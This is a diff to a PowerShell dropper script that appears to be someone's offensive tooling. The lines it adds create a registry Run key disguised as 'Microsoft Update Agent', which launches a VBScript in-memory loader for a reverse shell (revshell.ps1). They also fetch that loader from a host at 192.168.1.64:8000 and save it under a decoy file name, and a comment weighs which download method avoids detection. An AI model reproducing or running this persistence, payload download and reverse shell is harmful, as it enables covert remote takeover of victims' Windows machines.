@@ -30,3 +30,18 @@ New-Item "$InstallDir\MicrosoftSecurityUpdate.bat" -Force
 Set-Content "$InstallDir\MicrosoftSecurityUpdate.bat" 'python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py'
 
 C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.bat
+
+# create run registry key for revshell.ps1 in-memory loader
+$HashArguments = @{
+	Path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+	Name = "Microsoft Update Agent"
+	Value = "wscript /Nologo /E:VBScript ""C:\Users\Public\MSUpdateInfo.txt"""
+	PropertyType = "String"
+	Force = $true
+}
+New-ItemProperty @HashArguments 
+
+# download vbsript in-memory loader for revshell.ps1 
+(New-Object System.Net.WebClient).DownloadString('http://192.168.1.64:8000/MSUpdateInfo.txt') > "C:\Users\Public\MSUpdateInfo.txt"
+# or with InvokeWeb-Request, could cause detection ???
+# Invoke-WebRequest "http://192.168.1.64:8000/MSUpdateInfo.txt" -OutFile "C:\Users\Public\MSUpdateInfo.txt"
